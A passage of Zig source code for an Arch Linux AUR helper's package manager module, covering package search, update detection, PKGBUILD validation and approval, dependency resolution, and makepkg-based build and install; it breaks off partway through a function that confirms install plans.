const std = @import("std");

const alpm_module = @import("../alpm/manager.zig");
const alpm_bindings = @import("../alpm/bindings.zig");
const alpm_events = @import("../alpm/events.zig");
const pkgbuild_parser = @import("../pkgbuild/pkgbuild_parser.zig");
const homograph_validator = @import("../pkgbuild/homograph_validator.zig");
const post_install_validator = @import("../pkgbuild/post_install_validator.zig");
const local_source_validator = @import("../pkgbuild/local_source_validator.zig");
const validation = @import("../pkgbuild/shared_validtor.zig");
const operation_api = @import("operation_context");
const MakePackageConfiguration = @import("makepackage.zig").MakePackageConfiguration;

pub const models = @import("models.zig");
pub const rpc = @import("rpc_client.zig");
pub const vcs = @import("vcs.zig");
pub const srcinfo = @import("srcinfo.zig");
pub const events = @import("events.zig");
pub const builder = @import("builder.zig");
pub const dependency_resolver = @import("dependency_resolver.zig");
pub const version = @import("version.zig");
pub const native_events = alpm_events;

const AlpmManager = alpm_module.Manager;
pub const ReverseDependencyOptions = alpm_module.ReverseDependencyOptions;
const TransFlag = alpm_bindings.libalpm.TransFlag;
const PkgbuildInfo = pkgbuild_parser.pkgbuild_info;
const ParsedDependency = pkgbuild_parser.parsed_dep;
const ValidationFinding = validation.ValidationFinding;
const max_file_size = 32 * 1024 * 1024;

pub const InitOptions = struct {
    config_path: ?[]const u8 = null,
    root: bool = false,
    use_temp_path: bool = false,
    use_chroot: bool = false,
    chroot_path: []const u8 = "/var/lib/shelly/chroot",
    temp_path: ?[]const u8 = null,
    show_hidden_packages: bool = false,
    no_check: bool = true,
    cache_root: ?[]const u8 = null,
    aur_git_base_url: []const u8 = "https://aur.archlinux.org",
    makepkg_command: ?[]const u8 = null,
    operation_context: ?*operation_api.OperationContext = null,
};

pub const PkgbuildDiffRequest = struct {
    package_name: []const u8,
    old_pkgbuild: []const u8,
    new_pkgbuild: []const u8,
    warnings: []const ValidationFinding,
    source_files: *const std.StringHashMap([]const u8),
};

pub const PkgbuildApprovalHandler = struct {
    function: *const fn (data: ?*anyopaque, request: PkgbuildDiffRequest) bool,
    data: ?*anyopaque = null,
};

pub const PkgbuildValidation = struct {
    post_install: validation.ValidationResult,
    homograph: validation.ValidationResult,
    local_source: validation.ValidationResult,

    pub fn deinit(self: *PkgbuildValidation, allocator: std.mem.Allocator) void {
        self.post_install.deinit(allocator);
        self.homograph.deinit(allocator);
        self.local_source.deinit(allocator);
        self.* = undefined;
    }

    pub fn hasFindings(self: *const PkgbuildValidation) bool {
        return self.post_install.has_findings or self.homograph.has_findings or self.local_source.has_findings;
    }

    pub fn flatten(self: *const PkgbuildValidation, allocator: std.mem.Allocator) ![]ValidationFinding {
        const post = self.post_install.findings.items;
        const homograph = self.homograph.findings.items;
        const local_source = self.local_source.findings.items;
        const findings = try allocator.alloc(ValidationFinding, post.len + homograph.len + local_source.len);
        @memcpy(findings[0..post.len], post);
        @memcpy(findings[post.len .. post.len + homograph.len], homograph);
        @memcpy(findings[post.len + homograph.len ..], local_source);
        return findings;
    }
};

pub fn validatePkgbuild(
    allocator: std.mem.Allocator,
    io: std.Io,
    content: []const u8,
    base_directory: ?[]const u8,
) !PkgbuildValidation {
    const parser = pkgbuild_parser.PkgbuildParser{ .allocator = allocator, .io = io };
    var info = try parser.parser_content(content, base_directory);
    defer info.deinit(allocator);

    return validatePkgbuildInfo(allocator, io, &info, base_directory, content);
}

pub fn validatePkgbuildInfo(
    allocator: std.mem.Allocator,
    io: std.Io,
    info: *const PkgbuildInfo,
    base_directory: ?[]const u8,
    content: ?[]const u8,
) !PkgbuildValidation {
    var post_install = try (post_install_validator.PostInstallValidator{ .allocator = allocator }).validateWithContent(info.*, content);
    errdefer post_install.deinit(allocator);
    var homograph = try (homograph_validator.HomographValidator{ .allocator = allocator }).validate(info.*);
    errdefer homograph.deinit(allocator);
    return .{
        .post_install = post_install,
        .homograph = homograph,
        .local_source = try (local_source_validator.LocalSourceValidator{ .allocator = allocator, .io = io }).validate(info.*, base_directory),
    };
}

const PreparedPackage = struct {
    package_name: []u8,
    package_base: []u8,
    cache_path: []u8,
    pkgbuild_path: []u8,
    previous_commit: []u8,
    target_commit: []u8,
    old_pkgbuild: []u8,
    new_pkgbuild: []u8,
    digest: [std.crypto.hash.sha2.Sha256.digest_length]u8,
    info: PkgbuildInfo,
    validation_results: PkgbuildValidation,

    fn deinit(self: *PreparedPackage, allocator: std.mem.Allocator) void {
        self.validation_results.deinit(allocator);
        self.info.deinit(allocator);
        allocator.free(self.package_name);
        allocator.free(self.package_base);
        allocator.free(self.cache_path);
        allocator.free(self.pkgbuild_path);
        allocator.free(self.previous_commit);
        allocator.free(self.target_commit);
        allocator.free(self.old_pkgbuild);
        allocator.free(self.new_pkgbuild);
        self.* = undefined;
    }
};

const ApprovedReview = struct {
    commit: []u8,
    digest: [std.crypto.hash.sha2.Sha256.digest_length]u8,
};

pub const InstalledSnapshot = struct {
    name: []const u8,
    version: []const u8,
    explicit: bool,
};

pub fn applyInstalledState(
    allocator: std.mem.Allocator,
    packages: []models.Package,
    installed: []const InstalledSnapshot,
) !void {
    for (packages) |*package| {
        for (installed) |local| {
            if (!std.mem.eql(u8, package.name, local.name)) continue;
            const owned_version = try allocator.dupe(u8, local.version);
            allocator.free(package.version);
            package.version = owned_version;
            package.explicit = local.explicit;
            break;
        }
    }
}

pub fn collectVersionUpdates(
    allocator: std.mem.Allocator,
    installed: []const InstalledSnapshot,
    aur_packages: []const models.Package,
) ![]models.Update {
    var updates: std.ArrayList(models.Update) = .empty;
    errdefer {
        for (updates.items) |*update| update.deinit(allocator);
        updates.deinit(allocator);
    }
    for (aur_packages) |package| {
        for (installed) |local| {
            if (!std.mem.eql(u8, package.name, local.name)) continue;
            if (!(try version.isNewer(allocator, package.version, local.version))) break;
            try updates.append(allocator, try models.Update.init(
                allocator,
                package.name,
                local.version,
                package.version,
                package.url orelse "",
                package.package_base,
                package.description orelse "",
            ));
            break;
        }
    }
    return updates.toOwnedSlice(allocator);
}

pub const Manager = struct {
    const Self = @This();

    allocator: std.mem.Allocator,
    environ: std.process.Environ,
    alpm: *AlpmManager,
    aur_client: rpc.Client,
    dispatcher: events.Dispatcher,
    vcs_store: vcs.Store,
    pkgbase_cache: std.StringHashMap([]u8),
    bin_variant_cache: std.StringHashMap(?[]u8),
    currently_installing_dependencies: std.StringHashMap(void),
    approved_pkgbuild_reviews: std.StringHashMap(ApprovedReview),
    cache_root: []u8,
    aur_git_base_url: []u8,
    makepkg_command: ?[]u8,
    makepkg_config: *MakePackageConfiguration,
    vcs_store_path: []u8,
    chroot_path: []u8,
    use_chroot: bool,
    no_check: bool,
    skip_optional_dependency_prompt: bool = false,
    pkgbuild_approval_handler: ?PkgbuildApprovalHandler = null,
    operation_context: ?*operation_api.OperationContext = null,

    pub fn init(
        allocator: std.mem.Allocator,
        environ: std.process.Environ,
        options: InitOptions,
    ) !*Self {
        const temporary_root = if (options.use_temp_path) options.temp_path else null;
        const alpm = try AlpmManager.init(allocator, environ, .{ .config_path = options.config_path, .use_root = options.root, .temp_root_path = temporary_root });
        errdefer alpm.deinit();
        const makepkg_config = try MakePackageConfiguration.init(alpm.io(), allocator);
        errdefer makepkg_config.deinit();
        const cache_home = try resolveXdgHome(allocator, alpm.io(), environ, "XDG_CACHE_HOME", ".cache");
        defer allocator.free(cache_home);
        const data_home = try resolveXdgHome(allocator, alpm.io(), environ, "XDG_DATA_HOME", ".local/share");
        defer allocator.free(data_home);
        const cache_root = if (options.cache_root) |path|
            try allocator.dupe(u8, path)
        else
            try std.fs.path.join(allocator, &.{ cache_home, "Shelly" });
        errdefer allocator.free(cache_root);
        const aur_git_base_url = try allocator.dupe(
            u8,
            std.mem.trimEnd(u8, options.aur_git_base_url, "/"),
        );
        errdefer allocator.free(aur_git_base_url);
        const makepkg_command = if (options.makepkg_command) |command|
            try allocator.dupe(u8, command)
        else
            null;
        errdefer if (makepkg_command) |command| allocator.free(command);
        const vcs_store_path = try std.fs.path.join(allocator, &.{ data_home, "Shelly", "vcs.json" });
        errdefer allocator.free(vcs_store_path);
        const chroot_path = try allocator.dupe(u8, options.chroot_path);
        errdefer allocator.free(chroot_path);

        try std.Io.Dir.cwd().createDirPath(alpm.io(), cache_root);
        if (options.show_hidden_packages and !alpm.show_hidden_packages) _ = alpm.toggle_hidden_packages();

        const self = try allocator.create(Self);
        errdefer allocator.destroy(self);
        self.* = .{
            .allocator = allocator,
            .environ = environ,
            .alpm = alpm,
            .aur_client = rpc.Client.init(allocator, alpm.io()),
            .dispatcher = events.Dispatcher.init(allocator),
            .vcs_store = vcs.Store.init(allocator),
            .pkgbase_cache = std.StringHashMap([]u8).init(allocator),
            .bin_variant_cache = std.StringHashMap(?[]u8).init(allocator),
            .currently_installing_dependencies = std.StringHashMap(void).init(allocator),
            .approved_pkgbuild_reviews = std.StringHashMap(ApprovedReview).init(allocator),
            .cache_root = cache_root,
            .aur_git_base_url = aur_git_base_url,
            .makepkg_command = makepkg_command,
            .makepkg_config = makepkg_config,
            .vcs_store_path = vcs_store_path,
            .chroot_path = chroot_path,
            .use_chroot = options.use_chroot,
            .no_check = options.no_check,
            .operation_context = options.operation_context,
        };
        self.vcs_store.loadFile(self.io(), self.vcs_store_path) catch {};
        self.importOtherAurHelperCaches() catch {};
        return self;
    }

    pub fn deinit(self: *Self) void {
        const allocator = self.allocator;
        self.vcs_store.saveFile(self.io(), self.vcs_store_path) catch {};
        self.vcs_store.deinit();
        var package_bases = self.pkgbase_cache.iterator();
        while (package_bases.next()) |entry| {
            allocator.free(entry.key_ptr.*);
            allocator.free(entry.value_ptr.*);
        }
        self.pkgbase_cache.deinit();
        var bin_variants = self.bin_variant_cache.iterator();
        while (bin_variants.next()) |entry| {
            allocator.free(entry.key_ptr.*);
            if (entry.value_ptr.*) |value| allocator.free(value);
        }
        self.bin_variant_cache.deinit();
        var installing = self.currently_installing_dependencies.keyIterator();
        while (installing.next()) |key| allocator.free(key.*);
        self.currently_installing_dependencies.deinit();
        var approved = self.approved_pkgbuild_reviews.iterator();
        while (approved.next()) |entry| {
            allocator.free(entry.key_ptr.*);
            allocator.free(entry.value_ptr.commit);
        }
        self.approved_pkgbuild_reviews.deinit();
        self.dispatcher.deinit();
        self.aur_client.deinit();
        self.makepkg_config.deinit();
        self.alpm.deinit();
        allocator.free(self.cache_root);
        allocator.free(self.aur_git_base_url);
        if (self.makepkg_command) |command| allocator.free(command);
        allocator.free(self.vcs_store_path);
        allocator.free(self.chroot_path);
        allocator.destroy(self);
    }

    pub fn io(self: *Self) std.Io {
        return self.alpm.io();
    }

    /// Borrows a shared context and forwards it to nested ALPM and HTTP work.
    pub fn setOperationContext(self: *Self, context: ?*operation_api.OperationContext) void {
        self.operation_context = context;
        self.alpm.setOperationContext(context);
        self.aur_client.setOperationContext(context);
    }

    pub fn alpmDispatcher(self: *Self) *alpm_events.Dispatcher {
        return &self.alpm.dispatcher;
    }

    pub fn addAlpmProgressHandler(self: *Self, handler: alpm_events.Handler(alpm_events.ProgressArgs).T) !usize {
        return self.alpm.dispatcher.addProgressHandler(handler);
    }

    pub fn removeAlpmProgressHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeProgressHandler(index);
    }

    pub fn addAlpmQuestionHandler(self: *Self, handler: alpm_events.Handler(alpm_events.QuestionArgs).T) !usize {
        return self.alpm.dispatcher.addQuestionHandler(handler);
    }

    pub fn removeAlpmQuestionHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeQuestionHandler(index);
    }

    pub fn addAlpmErrorHandler(self: *Self, handler: alpm_events.Handler(alpm_events.ErrorArgs).T) !usize {
        return self.alpm.dispatcher.addErrorHandler(handler);
    }

    pub fn removeAlpmErrorHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeErrorHandler(index);
    }

    pub fn addAlpmInformationalHandler(self: *Self, handler: alpm_events.Handler(alpm_events.InformationalArgs).T) !usize {
        return self.alpm.dispatcher.addInformationalHandler(handler);
    }

    pub fn removeAlpmInformationalHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeInformationalHandler(index);
    }

    pub fn addAlpmScriptletHandler(self: *Self, handler: alpm_events.Handler(alpm_events.ScriptletArgs).T) !usize {
        return self.alpm.dispatcher.addScriptletHandler(handler);
    }

    pub fn removeAlpmScriptletHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeScriptletHandler(index);
    }

    pub fn addAlpmHookHandler(self: *Self, handler: alpm_events.Handler(alpm_events.HookArgs).T) !usize {
        return self.alpm.dispatcher.addHookHandler(handler);
    }

    pub fn removeAlpmHookHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeHookHandler(index);
    }

    pub fn addAlpmPacnewHandler(self: *Self, handler: alpm_events.Handler(alpm_events.PacnewArgs).T) !usize {
        return self.alpm.dispatcher.addPacnewHandler(handler);
    }

    pub fn removeAlpmPacnewHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removePacnewHandler(index);
    }

    pub fn addAlpmPacsaveHandler(self: *Self, handler: alpm_events.Handler(alpm_events.PacsaveArgs).T) !usize {
        return self.alpm.dispatcher.addPacsaveHandler(handler);
    }

    pub fn removeAlpmPacsaveHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removePacsaveHandler(index);
    }

    pub fn addAlpmReplacesHandler(self: *Self, handler: alpm_events.Handler(alpm_events.ReplacesArgs).T) !usize {
        return self.alpm.dispatcher.addReplacesHandler(handler);
    }

    pub fn removeAlpmReplacesHandler(self: *Self, index: usize) void {
        self.alpm.dispatcher.removeReplacesHandler(index);
    }

    pub fn respondToAlpmQuestion(self: *Self, response: alpm_events.QuestionResponse) void {
        self.alpm.dispatcher.respond(self.io(), response);
    }

    pub fn setPkgbuildApprovalHandler(self: *Self, handler: ?PkgbuildApprovalHandler) void {
        self.pkgbuild_approval_handler = handler;
    }

    pub fn getInstalledPackages(self: *Self) ![]models.Package {
        return self.getInstalledPackagesWithReverseDependencies(.{
            .required_by = true,
            .optional_for = true,
        });
    }

    pub fn getInstalledPackagesWithReverseDependencies(
        self: *Self,
        reverse_dependencies: ReverseDependencyOptions,
    ) ![]models.Package {
        var operation_scope = OperationScope.init(self, .search, null);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        const foreign = try self.alpm.get_foreign_packages();
        defer alpm_bindings.libalpm.OwnedPackage.deinitSlice(self.allocator, foreign);
        var names: std.ArrayList([]const u8) = .empty;
        defer names.deinit(self.allocator);
        var installed: std.ArrayList(InstalledSnapshot) = .empty;
        defer installed.deinit(self.allocator);
        for (foreign) |package| {
            const name = package.name() orelse continue;
            try names.append(self.allocator, name);
            try installed.append(self.allocator, .{
                .name = name,
                .version = package.version() orelse "",
                .explicit = package.install_reason() == .Explicit,
            });
        }
        var response = try self.aur_client.getInfo(names.items);
        errdefer response.deinit(self.allocator);
        try applyInstalledState(self.allocator, response.results, installed.items);
        try self.applyLocalReverseDependencies(response.results, reverse_dependencies);
        self.allocator.free(response.response_type);
        if (response.error_message) |message| self.allocator.free(message);
        return response.results;
    }

    pub fn searchPackages(self: *Self, query: []const u8) ![]models.Package {
        var operation_scope = OperationScope.init(self, .search, query);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        var search_response = try self.aur_client.search(query);
        defer search_response.deinit(self.allocator);
        std.mem.sort(models.Package, search_response.results, {}, struct {
            fn lessThan(_: void, lhs: models.Package, rhs: models.Package) bool {
                return lhs.popularity > rhs.popularity;
            }
        }.lessThan);
        const count = @min(search_response.results.len, 100);
        if (count == 0) return self.allocator.alloc(models.Package, 0);
        const names = try self.allocator.alloc([]const u8, count);
        defer self.allocator.free(names);
        for (search_response.results[0..count], names) |package, *name| name.* = package.name;
        var info_response = try self.aur_client.getInfo(names);
        errdefer info_response.deinit(self.allocator);
        try self.applyLocalReverseDependencies(info_response.results, .{
            .required_by = true,
            .optional_for = true,
        });
        self.allocator.free(info_response.response_type);
        if (info_response.error_message) |message| self.allocator.free(message);
        return info_response.results;
    }

    fn applyLocalReverseDependencies(
        self: *Self,
        packages: []models.Package,
        reverse_dependencies: ReverseDependencyOptions,
    ) !void {
        if (!reverse_dependencies.required_by and !reverse_dependencies.optional_for) return;
        for (packages) |*package| {
            const name_z = try self.allocator.dupeZ(u8, package.name);
            defer self.allocator.free(name_z);
            if (!self.alpm.is_package_installed(name_z)) continue;
            const local_package = try self.alpm.get_single_installed_package(name_z) orelse continue;
            if (reverse_dependencies.required_by)
                package.required_by = try local_package.owned_required_by(self.allocator);
            if (reverse_dependencies.optional_for)
                package.optional_for = try local_package.owned_optional_for(self.allocator);
        }
    }

    pub fn getPackagesNeedingUpdate(self: *Self, check_devel: bool) ![]models.Update {
        var operation_scope = OperationScope.init(self, .search, null);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        const foreign = try self.alpm.get_foreign_packages();
        defer alpm_bindings.libalpm.OwnedPackage.deinitSlice(self.allocator, foreign);
        var names: std.ArrayList([]const u8) = .empty;
        defer names.deinit(self.allocator);
        var installed: std.ArrayList(InstalledSnapshot) = .empty;
        defer installed.deinit(self.allocator);
        for (foreign) |package| {
            const name = package.name() orelse continue;
            try names.append(self.allocator, name);
            try installed.append(self.allocator, .{
                .name = name,
                .version = package.version() orelse "",
                .explicit = package.install_reason() == .Explicit,
            });
        }
        var response = try self.aur_client.getInfo(names.items);
        defer response.deinit(self.allocator);
        const base_updates = try collectVersionUpdates(self.allocator, installed.items, response.results);
        if (!check_devel) return base_updates;

        var updates: std.ArrayList(models.Update) = .fromOwnedSlice(base_updates);
        errdefer {
            for (updates.items) |*update| update.deinit(self.allocator);
            updates.deinit(self.allocator);
        }
        var candidates: std.ArrayList(VcsCheckCandidate) = .empty;
        defer {
            for (candidates.items) |*candidate| candidate.deinit(self.allocator);
            candidates.deinit(self.allocator);
        }
        for (installed.items, 0..) |local, installed_index| {
            if (!isVcsPackage(local.name) or containsUpdate(updates.items, local.name)) continue;
            const stored = self.vcs_store.get(local.name);
            if (stored.len != 0) {
                var candidate = try VcsCheckCandidate.init(
                    self.allocator,
                    local.name,
                    installed_index,
                    stored,
                    null,
                );
                candidates.append(self.allocator, candidate) catch |err| {
                    candidate.deinit(self.allocator);
                    return err;
                };
                continue;
            }

            const entries = self.getVcsSourceEntries(local.name) catch continue;
            const owned_entries = entries orelse continue;
            var candidate = VcsCheckCandidate.init(
                self.allocator,
                local.name,
                installed_index,
                owned_entries,
                owned_entries,
            ) catch |err| {
                vcs.deinitEntries(self.allocator, owned_entries);
                return err;
            };
            candidates.append(self.allocator, candidate) catch |err| {
                candidate.deinit(self.allocator);
                return err;
            };
        }

        runVcsChecksConcurrently(self.io(), self.environ, candidates.items, .{
            .function = fetchRemoteSha,
        });

        var vcs_store_changed = false;
        for (candidates.items) |*candidate| {
            if (candidate.first_seen) {
                const local = installed.items[candidate.installed_index];
                candidate.needs_update = firstSeenVcsNeedsUpdate(local.version, candidate.remote_shas);
                if (!candidate.needs_update) {
                    const entries = candidate.owned_entries.?;
                    for (entries, candidate.remote_shas) |*entry, *remote_sha| {
                        const sha = remote_sha.slice();
                        if (sha.len == 0) continue;
                        const owned_sha = try self.allocator.dupe(u8, sha);
                        self.allocator.free(entry.commit_sha);
                        entry.commit_sha = owned_sha;
                    }
                    try self.vcs_store.set(candidate.package_name, entries);
                    vcs_store_changed = true;
                    continue;
                }
            }
            if (try backfillMissingVcsBaselines(&self.vcs_store, candidate))
                vcs_store_changed = true;
            if (!candidate.needs_update) continue;
            const local = installed.items[candidate.installed_index];
            const metadata = findPackage(response.results, local.name);
            try updates.append(self.allocator, try models.Update.init(
                self.allocator,
                local.name,
                local.version,
                "latest-commit",
                if (metadata) |package| package.url orelse "" else "",
                if (metadata) |package| package.package_base else local.name,
                if (metadata) |package| package.description orelse "" else "",
            ));
        }
        if (vcs_store_changed) self.vcs_store.saveFile(self.io(), self.vcs_store_path) catch {};
        return updates.toOwnedSlice(self.allocator);
    }

    pub fn updatePackages(self: *Self, package_names: []const []const u8) !void {
        var completion: operation_api.CompletionStatus = .success;
        var operation_scope = OperationScope.init(self, .update, if (package_names.len == 0) null else package_names[0]);
        operation_scope.attach();
        defer operation_scope.finish(completion);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        const message = try std.mem.join(self.allocator, ", ", package_names);
        defer self.allocator.free(message);
        const text = try std.fmt.allocPrint(self.allocator, "Updating {d} packages: {s}", .{ package_names.len, message });
        defer self.allocator.free(text);
        self.raiseInfo(.informational_output, null, text, null, null);
        var result = try self.installPackagesImpl(package_names);
        defer result.deinit(self.allocator);

        if (result.failures.len > 0) {
            for (result.failures, 0..) |failure, index| {
                self.raisePackageProgress(.aur_package_failed, failure.package_name, index + 1, result.failures.len, failure.reason);
                completion = .failed;
            }
        }
    }

    pub fn fetchPkgbuild(self: *Self, package_name: []const u8) ![]u8 {
        var operation_scope = OperationScope.init(self, .download, package_name);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        const package_base = try self.resolvePkgbase(package_name);
        const message = try std.fmt.allocPrint(self.allocator, "Fetching PKGBUILD for {s} ({s})", .{ package_name, package_base });
        defer self.allocator.free(message);
        self.raiseInfo(.informational_output, package_name, message, null, null);
        return self.aur_client.fetchPkgbuild(package_base);
    }

    pub fn installDependenciesOnly(self: *Self, package_name: []const u8, include_make_dependencies: bool) !void {
        var operation_scope = OperationScope.init(self, .install, package_name);
        operation_scope.attach();
        defer operation_scope.finish(.success);
        errdefer operation_scope.fail();
        try self.checkCancelled();
        try self.alpm.sync(false);
        self.raisePackageProgress(.aur_download_start, package_name, 1, 1, "Downloading PKGBUILD to analyze dependencies");
        var prepared = try self.preparePackageForBuild(package_name, null);
        defer prepared.deinit(self.allocator);

        var selected = prepared.info;
        selected.parsed_check_depends = null;
        if (!include_make_dependencies) selected.parsed_make_depends = null;

        var collection = DependencyCollection.init(self.allocator);
        defer collection.deinit();
        var visited = std.StringHashMap(void).init(self.allocator);
        defer {
            var keys = visited.keyIterator();
            while (keys.next()) |key| self.allocator.free(key.*);
            visited.deinit();
        }
        try visited.put(try self.allocator.dupe(u8, prepared.package_base), {});
        try self.collectDependenciesRecursive(&selected, &collection, &visited);
        try self.requirePkgbuildApproval(&prepared);
        try self.requireDependencyApprovals(&collection);
        if (collection.repo.items.len == 0 and collection.aur.items.len == 0) {
            self.raisePackageProgress(.aur_package_completed, package_name, 1, 1, "All dependencies are already installed");
            return;
        }
        self.raisePackageProgress(.aur_install_start, package_name, 1, 1, "Installing dependencies");
        try self.installCollection(&collection);
        self.raisePackageProgress(.aur_package_completed, package_name, 1, 1, "Dependencies installed successfully");
    }

    pub fn installPackages(self: *Self, package_names: []const []const u8) !void {
        var completion: operation_api.CompletionStatus = .success;
        var operation_scope = OperationScope.init(self, .install, if (package_names.len == 0) null else package_names[0]);
        operation_scope.attach();
        defer operation_scope.finish(completion);
        errdefer operation_scope.fail();

        var result = try self.installPackagesImpl(package_names);
        defer result.deinit(self.allocator);

        if (result.failures.len > 0) {
            for (result.failures, 0..) |failure, index| {
                self.raisePackageProgress(.aur_package_failed, failure.package_name, index + 1, result.failures.len, failure.reason);
                completion = .failed;
            }
        }
    }

    const PackageFailure = struct {
        package_name: []const u8,
        reason: []const u8,
    };

    const PackageResult = struct {
        failures: []const PackageFailure,

        fn deinit(self: *PackageResult, allocator: std.mem.Allocator) void {
            for (self.failures) |failure|
                allocator.free(failure.package_name);
            allocator.free(self.failures);
        }
    };

    fn installPackagesImpl(self: *Self, package_names: []const []const u8) !PackageResult {
        try self.checkCancelled();
        try self.alpm.refresh();

        var plans = try self.prepareInstallPlans(package_names);
        defer {
            for (plans.items) |*plan| plan.deinit(self.allocator);
            plans.deinit(self.allocator);
        }
        // Discovery is deliberately completed for the whole operation before
        // the first review is shown. Only after every prepared checkout has
        // been approved may dependency installation or makepkg execution begin.
        try self.requireInstallPlanApprovals(plans.items);
        for (plans.items) |*plan|
            plan.selected_optional = try self.selectOptionalDependencies(&plan.prepared.info);
        try self.confirmInstallPlans(plans.items);

        var failures: std.ArrayList(PackageFailure) = .empty;

        errdefer {
            for (failures.items) |failure| {
                self.allocator.free(failure.package_name);
            }
            failures.deinit(self.allocator);
        }

        for (plans.items, 0..) |*plan, index| {
            const prepared = &plan.prepared;
            const package_name = prepared.package_name;
            const current = index + 1;

            const selected_optional = plan.selected_optional orelse &.{};
            const backend = self.dependencyBackend();
            const build_only = try dependency_resolver.collectBuildOnlyDependencies(self.allocator, &prepared.info, self.no_check, backend);
            defer builder.deinitPaths(self.allocator, build_only);

            try self.installCollection(&plan.dependencies);

            try self.prepareBuildDirectory(prepared.cache_path);
            self.raisePackageProgress(.aur_build_start, package_name, current, plans.items.len, "Building package with makepkg");
            if (!(try self.buildPreparedPackage(prepared, false))) {
                const owned_name = try self.allocator.dupe(u8, package_name);
                failures.append(self.allocator, .{
                    .package_name = owned_name,
                    .reason = "Failed to build package",
                }) catch |err| {
                    self.allocator.free(owned_name);
                    return err;
                };
                continue;
            }
            self.raisePackageProgress(.aur_build_done, package_name, current, plans.items.len, "");
            const requested_names: []const []const u8 = @ptrCast(plan.requested_names.items);
            const package_files = try self.selectBuiltPackageFiles(prepared.cache_path, requested_names);
            defer builder.deinitPaths(self.allocator, package_files);
            if (package_files.len == 0) {
                const owned_name = try self.allocator.dupe(u8, package_name);
                failures.append(self.allocator, .{
                    .package_name = owned_name,
                    .reason = "No matching package files produced by makepkg",
                }) catch |err| {
                    self.allocator.free(owned_name);
                    return err;
                };
                continue;
            }
            self.raisePackageProgress(.aur_install_start, package_name, current, plans.items.len, "");
            const install_paths: []const []const u8 = @ptrCast(package_files);
            try self.alpm.install_local_packages(install_paths, .{});
            self.raisePackageProgress(.aur_install_done, package_name, current, plans.items.len, "");
            for (requested_names) |requested_name|
                self.updateVcsStoreForPackage(requested_name, prepared.pkgbuild_path) catch |err|
                    self.raiseBestEffortFailure(requested_name, "Failed to update VCS metadata", err);
            self.installSelectedOptionalDependencies(package_name, selected_optional) catch |err|
                self.raiseBestEffortFailure(package_name, "Failed to install some optional dependencies", err);
            if (build_only.len > 0) {
                self.raisePackageProgress(.aur_cleanup_start, package_name, current, plans.items.len, "Removing build-only dependencies");
                const build_names: []const []const u8 = @ptrCast(build_only);
                self.removeRepoPackages(build_names, .{}, true) catch {};
                self.raisePackageProgress(.aur_cleanup_done, package_name, current, plans.items.len, "");
            }
            self.cleanBuildArtifacts(prepared.cache_path);
            for (requested_names) |requested_name|
                self.raisePackageProgress(.aur_package_completed, requested_name, current, plans.items.len, "");
        }
        return .{ .failures = try failures.toOwnedSlice(self.allocator) };
    }

    fn prepareInstallPlans(
        self: *Self,
        package_names: []const []const u8,
    ) !std.ArrayList(PreparedInstall) {
        var plans: std.ArrayList(PreparedInstall) = .empty;
        errdefer {
            for (plans.items) |*plan| plan.deinit(self.allocator);
            plans.deinit(self.allocator);
        }
        for (package_names, 0..) |package_name, index| {
            const current = index + 1;
            self.raisePackageProgress(.aur_download_start, package_name, current, package_names.len, "");

            const package_base = try self.resolvePkgbase(package_name);
            var existing_plan: ?*PreparedInstall = null;
            for (plans.items) |*candidate| {
                if (std.mem.eql(u8, candidate.prepared.package_base, package_base)) {
                    existing_plan = candidate;
                    break;
                }
            }
            if (existing_plan) |plan| {
                try plan.addRequestedName(self.allocator, package_name);
                self.raisePackageProgress(.aur_download_done, package_name, current, package_names.len, "");
                continue;
            }

            var plan = try self.prepareInstall(package_name);
            errdefer plan.deinit(self.allocator);
            try plans.append(self.allocator, plan);
            self.raisePackageProgress(.aur_download_done, package_name, current, package_names.len, "");
        }
        return plans;
    }

    fn prepareInstall(self: *Self, package_name: []const u8) !PreparedInstall {
        var prepared = try self.preparePackageForBuild(package_name, null);
        errdefer prepared.deinit(self.allocator);

        var dependencies = DependencyCollection.init(self.allocator);
        errdefer dependencies.deinit();
        var visited = std.StringHashMap(void).init(self.allocator);
        defer {
            var keys = visited.keyIterator();
            while (keys.next()) |key| self.allocator.free(key.*);
            visited.deinit();
        }
        try visited.put(try self.allocator.dupe(u8, prepared.package_base), {});
        try self.collectDependenciesRecursive(&prepared.info, &dependencies, &visited);

        var requested_names: std.ArrayList([]u8) = .empty;
        errdefer {
            for (requested_names.items) |name| self.allocator.free(name);
            requested_names.deinit(self.allocator);
        }
        const requested_name = try self.allocator.dupe(u8, package_name);
        requested_names.append(self.allocator, requested_name) catch |err| {
            self.allocator.free(requested_name);
            return err;
        };

        return .{
            .prepared = prepared,
            .dependencies = dependencies,
            .requested_names = requested_names,
        };
    }

    fn requireInstallPlanApprovals(self: *Self, plans: []PreparedInstall) !void {
        for (plans) |*plan| {
            try self.requirePkgbuildApproval(&plan.prepared);
            try self.requireDependencyApprovals(&plan.dependencies);
        }
    }

    fn requireDependencyApprovals(self: *Self, dependencies: *const DependencyCollection) !void {
        for (dependencies.aur.items) |*dependency| try self.requirePkgbuildApproval(&dependency.prepared);
    }

    fn confirmInstallPlans(self: *Self, plans: []const PreparedInstall) !void {
        const operation = self.dispatcher.operation orelse return;
        var arena = std.heap.ArenaAllocator.init(self.allocator);
        defer arena.deinit();
        const allocator = arena.allocator();
        var packages: std.ArrayList(operation_api.TransactionPackage) = .empty;
        defer packages.deinit(allocator);

        for (plans) |*plan| {
            const prepared = &plan.prepared;
            for (plan.requested_names.items) |requested_name|
                try appendTransactionPackage(&packages, allocator, .{
                    .name = requested_name,
                    .version = try prepared.info.get_full_version(allocator),
                    .repository = "AUR",
                    .package_base = prepared.package_base,
                    .revision = prepared.target_commit,
                    .source = .aur,
                    .role = .requested,
                });

